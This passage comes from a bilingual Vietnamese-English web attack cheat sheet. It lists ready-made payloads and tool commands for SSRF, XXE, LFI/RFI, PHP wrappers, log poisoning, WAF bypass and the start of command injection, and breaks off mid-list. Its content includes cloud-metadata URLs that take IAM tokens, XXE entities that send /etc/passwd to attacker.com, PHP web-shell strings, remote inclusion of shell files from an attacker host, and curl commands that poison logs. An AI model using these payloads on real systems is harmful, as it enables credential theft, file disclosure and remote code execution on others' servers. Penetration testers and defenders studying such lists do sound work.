    # 10. Uses `dict://` protocol to interact with local Redis.
    dict://127.0.0.1:6379/info
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng ssrfmap để kiểm thử tự động các cổng nội bộ trên các tham số có phản hồi.
    *   *English*: Use ssrfmap to automatically test internal ports on parameters that return data.
    ```bash
    # Fuzz internal ports using ssrfmap in standard request files
    python ssrfmap.py -r req.txt -p url -m portscan
    ```

---

### 3.2. Blind SSRF (SSRF mù - không phản hồi dữ liệu)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi máy chủ thực hiện yêu cầu đến URL cung cấp nhưng không trả lại bất cứ dữ liệu nào trên giao diện. Trạng thái lỗi hay thành công chỉ được phát hiện qua hành vi mạng (Network Behavior) hoặc độ trễ phản hồi HTTP (Timing differences).
    *   *English*: Blind SSRF exists when the server issues the web request but hides the response content. Verification must be performed using out-of-band monitoring or timing checks.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Nhập đường dẫn trỏ về máy chủ OOB (Out-of-Band) mà bạn kiểm soát (ví dụ: Burp Collaborator, Interactsh). Nếu OOB Server nhận được truy vấn DNS hoặc kết nối HTTP từ địa chỉ IP của máy chủ ứng dụng, lỗi Blind SSRF được xác thực.
    *   *English*: Supply a URL pointing to an Out-of-Band (OOB) listener (e.g., Interactsh). Check the listener logs for incoming HTTP or DNS queries originating from the target web server.
*   **Payloads (10 Payloads)**:
    ```txt
    # 1. Basic OOB callback query.
    http://your-interactsh-domain.com

    # 2. SSL/TLS OOB check.
    https://your-interactsh-domain.com/ping

    # 3. OOB test via non-standard HTTP port.
    http://your-interactsh-domain.com:8080

    # 4. FTP protocol callback test.
    ftp://your-interactsh-domain.com/test.txt

    # 5. Gopher protocol callback to probe Memcached.
    gopher://your-interactsh-domain.com:11211/_stats

    # 6. Time-based blind check (fast connection close vs. timeout on open port).
    http://127.0.0.1:22

    # 7. Scan local Class A subnet blind.
    http://10.0.0.1:80

    # 8. Scan local Class C subnet blind.
    http://192.168.1.1:80

    # 9. Scan local Class B subnet blind.
    http://172.16.0.1:80

    # 10. LDAP protocol interaction check.
    ldap://your-interactsh-domain.com:389/toc
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng công cụ lắng nghe OOB như interactsh kết hợp ssrfmap để phát hiện Blind SSRF.
    *   *English*: Use OOB listening tools like interactsh combined with ssrfmap to discover Blind SSRF.
    ```bash
    # Start interactsh listener to monitor out-of-band network callbacks
    interactsh-client -v
    # Trigger blind SSRF fuzzing with OOB payload generator
    python ssrfmap.py -r req.txt -p url -m portscan
    ```

---

### 3.3. Cloud Metadata SSRF (SSRF khai thác Metadata dịch vụ đám mây)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi ứng dụng mục tiêu được triển khai trên hạ tầng Điện toán đám mây (AWS, GCP, Azure) và dính SSRF. Kẻ tấn công có thể truy cập địa chỉ IP Link-Local đặc trị `169.254.169.254` nhằm lấy cắp cấu hình máy ảo, SSH Keys, và đặc biệt là Access Tokens của tài khoản dịch vụ đám mây (IAM/Service Account credentials).
    *   *English*: When target hosts reside on cloud infrastructures (AWS, GCP, Azure), they can access the link-local address `169.254.169.254` to query VM metadata. An SSRF vulnerability can expose critical assets, including API keys and IAM credentials.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi các URL trỏ trực tiếp đến API Metadata của các nền tảng đám mây lớn và rà soát phản hồi xem có cấu trúc JSON chứa token hoặc cấu hình phần cứng máy ảo hay không.
    *   *English*: Inject cloud-specific metadata request URIs into parameters and inspect the response for access keys or instance details.
*   **Payloads (10 Payloads)**:
    ```txt
    # 1. AWS IMDSv1 root metadata path.
    http://169.254.169.254/latest/meta-data/

    # 2. AWS IAM security credentials directory (leaks active role name).
    http://169.254.169.254/latest/meta-data/iam/security-credentials/

    # 3. AWS IAM token extraction (replace ROLE_NAME with output from step 2).
    http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

    # 4. AWS User Data scripts containing setup credentials.
    http://169.254.169.254/latest/user-data/

    # 5. GCP default service account token retrieval.
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

    # 6. GCP instance disk metadata folder.
    http://169.254.169.254/computeMetadata/v1/instance/disks/

    # 7. Azure metadata endpoint (requires `Metadata: true` header in request).
    http://169.254.169.254/metadata/instance?api-version=2021-02-01

    # 8. Azure Managed Identity token retrieval.
    http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

    # 9. AWS IMDS IPv6 representation bypass.
    http://[fd00:ec2::254]/latest/meta-data/

    # 10. Decimal encoding of the metadata IP `169.254.169.254` to bypass string filters monitoring the IP sequence.
    http://2852039166/latest/meta-data/
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng các module chuyên biệt của ssrfmap để tự động hóa việc truy xuất metadata đám mây.
    *   *English*: Use specialized ssrfmap modules to automate the retrieval of cloud service instance metadata.
    ```bash
    # Scan and exploit AWS/GCP/Azure instance metadata credentials
    python ssrfmap.py -r req.txt -p url -m aws,gcp,azure
    ```

---


## 4. XML External Entity (XXE)

XML External Entity (XXE) là một loại lỗ hổng bảo mật nhắm vào các ứng dụng phân tích cú pháp XML (XML Parsers). Lỗ hổng này phát sinh khi ứng dụng xử lý tài liệu XML chứa thực thể bên ngoài (External Entity) mà không được cấu hình chặn DTD (Document Type Definition).

### 4.1. Basic XXE (XXE cơ bản - có phản hồi dữ liệu)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi ứng dụng chấp nhận đầu vào là XML (ví dụ: trong yêu cầu API có Header `Content-Type: application/xml`) và hiển thị trực tiếp giá trị của thực thể XML đã phân giải (dereferenced entity) lên phản hồi trang web.
    *   *English*: Basic XXE occurs when the application parses user-controlled XML inputs and returns the value of the resolved external entities directly within the HTTP response.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thay đổi kiểu dữ liệu gửi lên thành `application/xml`, thử chèn khai báo một thực thể chung (`&xxe;`) trỏ đến một tệp tin hệ thống. Nếu nội dung tệp tin hiển thị trong phản hồi, hệ thống dính lỗ hổng.
    *   *English*: Submit an XML document with a basic SYSTEM entity referring to a local file. Check if the parsed result exposes the file content.
*   **Payloads (10 Payloads)**:
    1. **Standard payload to read `/etc/passwd` on Linux.**:
       ```xml
       <?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
       <root>&xxe;</root>
       ```
    2. **Standard payload to read Windows configuration files.**:
       ```xml
       <?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
       <root>&xxe;</root>
       ```
    3. **SSRF via XXE (testing local port response).**:
       ```xml
       <?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE test [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]>
       <root>&xxe;</root>
       ```
    4. **PHP filter wrapper to extract web application source code as Base64.**:
       ```xml
       <?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE test [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
       <root>&xxe;</root>
       ```
    5. **Java `netdoc://` protocol handler bypass.**:
       ```xml
       <?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE test [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]>
       <root>&xxe;</root>
       ```
    6. **Gopher protocol usage for port manipulation.**:
       ```xml
       <?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE test [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">]>
       <root>&xxe;</root>
       ```
    7. **References a remote DTD to bypass parser constraints.**:
       ```xml
       <!DOCTYPE data [
         <!ENTITY % ext SYSTEM "http://attacker.com/external.dtd">
         %ext;
       ]>
       <data>&xxe;</data>
       ```
    8. **XXE payload embedded inside an SVG file (triggers on file-upload components parsing images).**:
       ```xml
       <?xml version="1.0" standalone="yes"?>
       <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
       <svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">
         <text font-size="16" x="0" y="16">&xxe;</text>
       </svg>
       ```
    9. **SSRF to cloud metadata service via XML entity resolution.**:
       ```xml
       <?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
       <root>&xxe;</root>
       ```
    10. **Re-encodes the XML document to UTF-16 Big Endian to bypass simple signature WAFs that only monitor UTF-8/ASCII bytes.**:
        ```xml
        <?xml version="1.0" encoding="UTF-16BE"?>
        <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>
        ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng XXEinjector với giao thức HTTP để tự động hóa việc đọc tệp tin khi ứng dụng hiển thị trực tiếp dữ liệu.
    *   *English*: Use XXEinjector with HTTP protocol to automate file reading when the application displays returned data.
    ```bash
    # Inject standard XML file system read using local Burp Suite repeater verification
    # Run XXEinjector for direct file retrieval
    ruby XXEinjector.rb --host=YOUR_OOB_IP --file=request.txt --path=/etc/passwd --httpport=80 --oob=http
    ```

---

### 4.2. Blind XXE (Out-of-Band XXE - XXE mù)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi ứng dụng phân tích cú pháp XML lỗi nhưng không phản hồi kết quả dữ liệu ra màn hình. Mọi hoạt động đọc tệp tin hay gọi API phải được thực hiện gián tiếp qua cơ chế gọi ngược ngoại vi (Out-of-Band) đến máy chủ của kẻ tấn công.
    *   *English*: Blind XXE occurs when the XML parser is vulnerable but does not print any output or error details. Exfiltration requires sending the resolved parameters out-of-band to an external server.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Khai báo thực thể tham số (Parameter Entity `%`) trỏ về OOB Listener. Nếu nhận được DNS query của OOB server, bộ phân tích XML có hỗ trợ nạp thực thể ngoài.
    *   *English*: Declare a parameter entity pointing to a remote server. Monitor OOB listener logs for connections when the XML is processed.
*   **Payloads (10 Payloads)**:
    1. **Basic parameter entity callback validation.**:
       ```xml
       <?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://your-oob-domain.com/ping"> %xxe;]>
       <root>test</root>
       ```
    2. **Exfiltrates Linux local file content using a nested parameter entity via a remote DTD.**:
       ```xml
       <!DOCTYPE r [
         <!ENTITY % file SYSTEM "file:///etc/passwd">
         <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
         %dtd;
       ]>
       <r>&send;</r>
       ```
    3. **Base64 encodes local files to prevent XML parsing syntax failures on special characters like `<`.**:
       ```xml
       <!DOCTYPE r [
         <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
         <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
         %dtd;
       ]>
       <r>&send;</r>
       ```
    4. **Exfiltrates Windows win.ini file.**:
       ```xml
       <!DOCTYPE r [
         <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
         <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
         %dtd;
       ]>
       <r>&send;</r>
       ```
    5. **Inline evaluation syntax for OOB exfiltration.**:
       ```xml
       <!DOCTYPE r [
         <!ENTITY % file SYSTEM "file:///etc/hostname">
         <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
         %dtd;
         %eval;
       ]>
       <r>test</r>
       ```
    6. **References a remote DTD directly without general entities.**:
       ```xml
       <!DOCTYPE test [
         <!ENTITY % remote SYSTEM "http://attacker.com/eval.dtd">
         %remote;
       ]>
       <test>test</test>
       ```
    7. **Bypasses egress firewalls (no external connections allowed) by reusing and overriding a local DTD file (like `catalog.dtd`).**:
       ```xml
       <!DOCTYPE test [
         <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/xml-core/schema/catalog.dtd">
         <!ENTITY % override "<!ENTITY &#x25; file SYSTEM 'file:///etc/passwd'><!ENTITY &#x25; eval '&lt;!ENTITY &#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;&gt;'>%eval;%error;">
         %local_dtd;
       ]>
       <test>test</test>
       ```
    8. **Local DTD hijacking utilizing `docbookx.dtd`.**:
       ```xml
       <!DOCTYPE doc [
         <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
         <!ENTITY % IS10279 "SYSTEM 'http://attacker.com/evil.dtd'">
         %local;
       ]>
       <doc>test</doc>
       ```
    9. **Exfiltrates cloud metadata details OOB.**:
       ```xml
       <!DOCTYPE r [
         <!ENTITY % file SYSTEM "http://169.254.169.254/latest/meta-data/hostname">
         <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
         %dtd;
       ]>
       <r>&send;</r>
       ```
    10. **Uses character set encoding `ISO-8859-1` to evade string-matching WAF engines monitoring XML standard configurations.**:
        ```xml
        <?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/ping"> %xxe;]>
        <root>test</root>
        ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng XXEinjector với chế độ OOB để tự động khai thác Blind XXE và gửi file ra ngoài.
    *   *English*: Use XXEinjector with OOB mode to automatically exploit Blind XXE and exfiltrate files.
    ```bash
    # Run XXEinjector to listen for incoming connections and exfiltrate target file
    ruby XXEinjector.rb --host=YOUR_OOB_IP --file=request.txt --path=/etc/passwd --httpport=80 --oob=http
    ```

---

### 4.3. Error-based XXE (XXE dựa trên lỗi)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi ứng dụng không trả kết quả trực tiếp ra màn hình, nhưng các lỗi của bộ phân tích XML (XML Parser error stack traces) hiển thị chi tiết và chứa nội dung của tệp tin hệ thống do cơ chế phân giải thực thể bị lỗi (ví dụ: lỗi "File not found" kèm tên tệp chứa dữ liệu).
    *   *English*: Error-based XXE is identified when the application triggers parsing exceptions that include sensitive system file contents within the returned error/trace messages.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thiết lập cấu trúc thực thể lồng nhau để đọc một file nhạy cảm, sau đó cố gắng nạp một tệp tin không tồn tại có đường dẫn chứa nội dung tệp nhạy cảm vừa đọc. Điều này ép bộ phân tích XML xuất ra lỗi kèm dữ liệu tệp.
    *   *English*: Construct nested parameters to load a target file, then reference a non-existent file name composed of the target file's content to force a verbose "file not found" exception containing the data.
*   **Payloads (10 Payloads)**:
    1. **Force a file-not-found error leaking Linux `/etc/passwd`.**:
       <!-- ⚠️ Context Warning: Parameter entity references (%) cannot be used inside markup declarations in the internal DTD subset according to XML standards. The following payloads (1-3, 5-6, 9) require an external DTD configuration to execute, or must target a local DTD to override (Payload 4). -->
       ```xml
       <!DOCTYPE foo [
         <!ENTITY % file SYSTEM "file:///etc/passwd">
         <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
         %eval;
         %error;
       ]>
       ```
    2. **Leak Windows `win.ini` file via error stack.**:
       ```xml
       <!DOCTYPE foo [
         <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
         <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
         %eval;
         %error;
       ]>
       ```
    3. **Leak base64 encoded data to avoid syntax errors inside the XML parser.**:
       ```xml
       <!DOCTYPE foo [
         <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
         <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
         %eval;
         %error;
       ]>
       ```
    4. **Error-based local DTD override payload using `catalog.dtd`.**:
       ```xml
       <!DOCTYPE foo [
         <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/xml-core/schema/catalog.dtd">
         <!ENTITY % override "<!ENTITY &#x25; file SYSTEM 'file:///etc/passwd'><!ENTITY &#x25; eval '&lt;!ENTITY &#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;&gt;'>%eval;%error;">
         %local_dtd;
       ]>
       ```
    5. **Trigger connection error utilizing FTP protocol to leak hostname details.**:
       ```xml
       <!DOCTYPE foo [
         <!ENTITY % file SYSTEM "file:///etc/hostname">
         <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'ftp://invalid-server/%file;'>">
         %eval;
         %error;
       ]>
       ```
    6. **HTTP protocol connection error to exfiltrate file data.**:
       ```xml
       <!DOCTYPE foo [
         <!ENTITY % file SYSTEM "file:///etc/passwd">
         <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://127.0.0.1:9999/%file;'>">
         %eval;
         %error;
       ]>
       ```
    7. **Error-based DTD override using `docbookx.dtd`.**:
       ```xml
       <!DOCTYPE foo [
         <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
         <!ENTITY % override "<!ENTITY &#x25; file SYSTEM 'file:///etc/passwd'><!ENTITY &#x25; eval '&lt;!ENTITY &#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;&gt;'>%eval;%error;">
         %local_dtd;
       ]>
       ```
    8. **VMware infrastructure specific catalog.dtd override.**:
       ```xml
       <!DOCTYPE foo [
         <!ENTITY % local_dtd SYSTEM "file:///usr/lib/vmware/hostd/docroot/client/catalog/en/catalog.dtd">
         <!ENTITY % override "<!ENTITY &#x25; file SYSTEM 'file:///etc/vmware/config'><!ENTITY &#x25; eval '&lt;!ENTITY &#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;&gt;'>%eval;%error;">
         %local_dtd;
       ]>
       ```
    9. **Leak OS description file via parser error.**:
       ```xml
       <!DOCTYPE foo [
         <!ENTITY % file SYSTEM "file:///etc/issue">
         <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
         %eval;
         %error;
       ]>
       ```
    10. **UTF-7 encoded XML DOCTYPE declaration to completely bypass text pattern-matching firewalls (parsed by older systems supporting UTF-7).**:
       ```xml
       <?xml version="1.0" encoding="UTF-7"?>
       +ADwAIQBEAE8AQwBUAFkAUABFACAAZgBvAG8AIABbAA0ACgAgACAAPAhFTlRJVFkgJQAgAGYAaQBsAGUAIABTAFkAUwBUAEUATQAgACcAZgBpAGwAZQA6AC8ALwAvAGUAdABjAC8AcABhAHMAcwB3AGQAJwA+AA0ACgAgACAAPAhFTlRJVFkgJQAgAGUAdgBhAGwAIAAiADwAIQBFTlRJVFkgJgB4MDU7ACAAZQByAHIAbwByACAAUwBZAFMAVABFAE0AIAAnAGYAaQBsAGUAOgAvAC8ALwBuAG8AbgBlAHgAaQBzAHQAZQBuAHQALwAlAGYAaQBsAGUAOwAnAD4AIgA+AA0ACgAgACAAYgBlAHYAYQBsADsADQAKACAgAGIAZQByAHIAbwByADsADQAKAF0APgA=
       ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng XXEinjector với chế độ lỗi để kích hoạt các phản hồi chi tiết từ bộ phân tích XML.
    *   *English*: Run XXEinjector using the error-based OOB parameter option to trigger parsing exceptions and extract local files.
    ```bash
    # Run XXEinjector to extract file path using error-based exfiltration method
    ruby XXEinjector.rb --host=YOUR_OOB_IP --file=request.txt --path=/etc/passwd --httpport=80 --oob=error
    ```

---

## 5. LFI/RFI + Path Traversal

LFI/RFI + Path Traversal xảy ra khi ứng dụng nhận đầu vào là tên đường dẫn tệp tin và thực hiện đọc/thực thi tệp tin đó mà không qua kiểm duyệt, cho phép đọc tệp hệ thống hoặc thực thi mã từ xa.

### 5.1. Basic Path Traversal / LFI
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện khi ứng dụng sử dụng các tham số trong URL hoặc POST body để chỉ định tên tệp tin cần đọc, tải hoặc bao gồm (như `file=`, `page=`, `doc=`).
    *   *English*: Identified by parameters specifying filenames or paths in requests (such as `file=`, `page=`, `doc=`), returning system file structures or static resources.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử nghiệm gửi các chuỗi điều hướng thư mục như `../` hoặc `..\` cùng tên tệp mặc định của hệ thống để xem ứng dụng có trả về nội dung tệp đó không.
    *   *English*: Input directory traversal sequences like `../` or `..\` combined with default system filenames and analyze response text.
*   **Payloads (10 Payloads)**:
```
../../../../etc/passwd                               # Linux system account file lookup
../../../../etc/hosts                                # Linux network hostname lookup
../../../../etc/issue                                # Linux OS release information lookup
../../../../etc/resolv.conf                          # Linux DNS resolver configuration lookup
..\..\..\..\windows\win.ini                           # Windows system initialization configuration
..\..\..\..\windows\system32\drivers\etc\hosts       # Windows network hostname lookup
/etc/passwd                                          # Absolute path file lookup on Linux
C:\windows\win.ini                                   # Absolute path file lookup on Windows
/proc/self/cmdline                                   # Process command line arguments lookup
....//....//....//etc/passwd                               #  Nested path traversal sequence to bypass recursive filtering WAF rules.
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng ffuf hoặc wfuzz để quét tự động các tham số và đường dẫn LFI bằng danh sách từ khóa LFI-Jhaddix.
    *   *English*: Use ffuf or wfuzz to automate scanning for LFI parameters and traversal paths using the LFI-Jhaddix list.
    ```bash
    ffuf -u 'http://target.com/index.php?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs <normal_size>
    ```


---

### 5.2. PHP Wrappers
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng chạy trên nền tảng PHP và hỗ trợ cơ chế nạp tệp tin thông qua các wrapper tích hợp sẵn.
    *   *English*: The web server is powered by PHP and accepts input streams routed to standard integrated wrappers.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử chèn `php://filter/convert.base64-encode/resource=index.php` để lấy mã nguồn dưới dạng Base64 mà không thực thi.
    *   *English*: Try passing wrappers such as `php://filter` to dump source code as Base64.
*   **Payloads (10 Payloads)**:
```
php://filter/convert.base64-encode/resource=index.php # Base64 encode filter read to bypass execution
php://filter/read=string.rot13/resource=index.php     # ROT13 filter read bypass
php://input                                           # POST data input wrapper (requires allow_url_include=On)
data://text/plain,<?php system($_GET['cmd']); ?>      # Plain PHP code execution wrapper (requires allow_url_include=On)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= # Base64 dynamic PHP execution wrapper
zip://uploads/avatar.zip%23shell.php                  # Executes shell.php stored inside uploaded ZIP archive (Note: URL fragment # must be URL-encoded to %23)
phar://uploads/avatar.png/shell.php                   # Executes shell.php stored inside PHAR format archive
php://filter/read=string.toupper/resource=config.php  # Uppercase conversion wrapper test
php://filter/zlib.deflate/convert.base64-encode/resource=config.php # Compressed and base64-encoded source read
php://filter/read=convert.base64-encode/resource=../../../../etc/passwd #  Base64 filter read with path traversal to bypass LFI detection WAF rules.
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng ffuf để fuzzing các wrapper PHP và trích xuất mã nguồn tự động.
    *   *English*: Use ffuf to fuzz dynamic PHP wrappers and automate source code extraction.
    ```bash
    ffuf -u 'http://target.com/index.php?file=FUZZ' -w php_wrappers_list.txt -fs <normal_size>
    ```


---

### 5.3. Log Poisoning
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Đã phát hiện lỗ hổng LFI và máy chủ lưu trữ log file (như Apache/Nginx access log) ở vị trí có thể đọc được.
    *   *English*: A path traversal vulnerability is confirmed, and server log files are hosted in readable directories.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Truy cập các đường dẫn log mặc định như `/var/log/apache2/access.log` và kiểm tra xem thông tin User-Agent của bạn có hiển thị trong đó không.
    *   *English*: Attempt to read known logs (e.g. `/var/log/nginx/access.log`) and verify if request details reflect on page.
*   **Payloads (10 Payloads)**:
```
/var/log/apache2/access.log                           # Apache access log (poison via malicious User-Agent header)
/var/log/nginx/access.log                            # Nginx access log poisoning target
/var/log/auth.log                                    # Auth log poisoning target (ssh '<?php system($_GET[0]);?>'@target)
/var/log/mail.log                                    # Mail service log poisoning target
/var/lib/php/sessions/sess_<session_id>              # PHP session file read (poison via session variable injection)
/tmp/sess_<session_id>                               # Alternate PHP session storage path on Linux
/proc/self/environ                                   # Environment block containing HTTP headers (poison User-Agent)
/proc/self/fd/0                                      # Read from standard input file descriptor
C:\inetpub\logs\LogFiles\W3SVC1\u_ex.log             # IIS web server access log path on Windows
/var/log/nginx/access.log?cmd=<?php system($_GET['cmd']); ?> #  User-Agent containing nested command tags to poison logs and bypass simple string-matching WAF rules.
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng curl để gửi mã khai thác PHP vào User-Agent header để đầu độc log, sau đó gọi lại qua LFI.
    *   *English*: Use curl to inject a PHP shell code into the User-Agent header to poison logs, then reference it using LFI.
    ```bash
    curl -s -A "<?php system($_GET['cmd']); ?>" "http://target.com/index.php"
    curl -s "http://target.com/index.php?file=/var/log/apache2/access.log&cmd=id"
    ```


---

### 5.4. Remote File Inclusion (RFI)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện khi ứng dụng chấp nhận một URL đầy đủ làm tham số tải file và nạp nó vào tiến trình thực thi.
    *   *English*: Present when the application permits full external URLs in file loading parameters and runs them.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Nhập địa chỉ của một máy chủ bên ngoài (ví dụ: `http://attacker.com/shell.txt`) để xem máy chủ mục tiêu có tải file đó về không.
    *   *English*: Input an external domain or IP hosting a test file and check if target server performs outgoing request.
*   **Payloads (10 Payloads)**:
```
http://attacker.com/shell.txt                        # Simple HTTP remote file inclusion
https://attacker.com/shell.txt                       # Secure HTTPS remote file inclusion
ftp://attacker.com/shell.txt                         # FTP protocol remote file inclusion
\\attacker-ip\share\shell.php                        # SMB share file inclusion (works on Windows even with allow_url_include=Off)
http://attacker.com/shell                            # File inclusion omitting extension
http://attacker.com/shell.txt?                       # Query parameter append bypass
http://attacker.com/shell.txt#                       # URL fragment append bypass
http://attacker.com/                                 # Remote root file inclusion
http:/attacker.com/shell.txt                         # Single slash RFI bypass for simple filters
http://attacker.com/shell.txt?                       #  RFI bypass using trailing question mark to ignore extension-appending WAF checks.
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng wfuzz để quét RFI bằng cách truyền danh sách tên miền kiểm thử bên ngoài.
    *   *English*: Use wfuzz to scan for RFI by inputting a wordlist of remote URLs.
    ```bash
    wfuzz -c -z file,rfi_servers.txt 'http://target.com/index.php?file=FUZZ'
    ```


---

### 5.5. WAF Bypass (WAF Bypass Payload included)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi chèn các payload LFI cơ bản thì bị hệ thống trả về lỗi `403 Forbidden` hoặc `400 Bad Request` do bị tường lửa (WAF) ngăn chặn.
    *   *English*: Common traversal sequences are blocked by web application firewalls, returning `403` or `400` status codes.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử nghiệm các biến thể mã hóa (Double URL encode, Overlong UTF-8) hoặc lồng chuỗi (`....//`) để vượt qua bộ lọc.
    *   *English*: Test double URL encoding, overlong UTF-8, or nested path sequences to bypass input sanitizers.
*   **Payloads (10 Payloads)**:
```
..%252f..%252f..%252fetc/passwd                      # Double URL encoded traversal (bypasses single-decode filters)
..%c0%af..%c0%afetc/passwd                           # Overlong UTF-8 slash encoding
....//....//....//etc/passwd                         # Nested traversal sequences (bypasses recursive strip filters)
..%2f..%2f..%2fetc%2fpasswd                          # Basic URL encoded traversal
..%5c..%5c..%5cwindows/win.ini                       # Windows backslash URL encoded traversal
../../../../etc/passwd%00                            # ⚠️ Null byte truncation (PHP < 5.3.4)
../../../../etc/passwd/./././././././                # Path length truncation bypass
?file=index.php&file=../../../../etc/passwd          # HTTP Parameter Pollution (HPP) bypass
/etc/passwd/                                         # Trailing slash extension check bypass
php://filter/convert.base64-encode/resource=../../../../etc/passwd # Combined wrapper and traversal (WAF Bypass)
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Fuzzing với burp suite sử dụng danh sách LFI bypass của PayloadsAllTheThings.
    *   *English*: Fuzz parameters with Burp Suite using LFI bypass wordlists from PayloadAllTheThings.
    ```bash
    # Fuzz for LFI bypasses using ffuf with double encoding and filter bypass payloads
    ffuf -u "http://target.com/index.php?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-bypasses.txt -fs <normal_response_size>
    # Curl command executing LFI bypass via double URL encoded path
    curl -s "http://target.com/index.php?file=..%252f..%252f..%252fetc%252fpasswd"
    ```

---

## 6. Command Injection (OS Injection)

Command Injection xảy ra khi đầu vào của người dùng được nối trực tiếp vào các hàm thực thi lệnh hệ điều hành của máy chủ mà không được làm sạch, cho phép thực thi mã tùy ý.

### 6.1. Active Command Injection (Direct Output)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện khi ứng dụng thực thi một lệnh hệ điều hành và hiển thị trực tiếp toàn bộ kết quả stdout/stderr lên giao diện trang web.
    *   *English*: Command execution stdout/stderr is returned directly in the application web response.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Nhập các ký tự nối lệnh như `;`, `|`, `&`, `&&`, `||` tiếp sau bằng lệnh kiểm tra (`id`, `whoami`).
    *   *English*: Test parameter values with metacharacters like `;`, `|`, `&`, `&&`, `||` followed by probe commands.
*   **Payloads (10 Payloads)**:
```
; id                                                 # Terminates command and executes id (Linux)
& id                                                 # Backgrounds execution and runs id (Linux/Windows)
